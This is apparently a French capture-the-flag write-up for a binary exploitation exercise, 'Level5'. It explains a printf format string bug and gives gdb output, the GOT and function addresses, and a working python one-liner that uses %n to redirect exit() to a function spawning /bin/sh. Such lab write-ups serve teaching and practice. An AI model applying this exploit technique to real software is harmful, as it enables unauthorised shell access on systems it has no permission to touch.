## Level5

On trouve une fonction qui n'est pas appellé : `o()`. Cette fonction fait un appel à `system(/bin/sh)`

Le main fait appel à une fonction `n()` qui lit sur `stdin` et met le résultat en paramètre à `printf`, puis `exit()`

### Objectif:

Il faut appeler la fonction `o()`.

Dans la fonction `exit()` on voit un jump à une adresse:

```gdb
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
```
C'est une adresse dans la GOT, si nous écrivons à cette adresse on peut faire jump `exit` à l'endroit que nous voulons.

### Solution

On va tout d'abord passer l'adresse sur laquelle nous voulons réécrire.

Il faut ensuite que `printf` affiche autant de caractère que la valeur de l'adresse de la fonction o(). 

L'indicateur de conversion `%n` va écrire ce résultat:

`ADRESSE + CHAMP DE LARGEUR [ADRESSE DE o()] + %n`

`exit():  0x08049838`
`o():     0x080484a4 (134513828 decimal)`

`cat <(python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n" )') - | ./level5`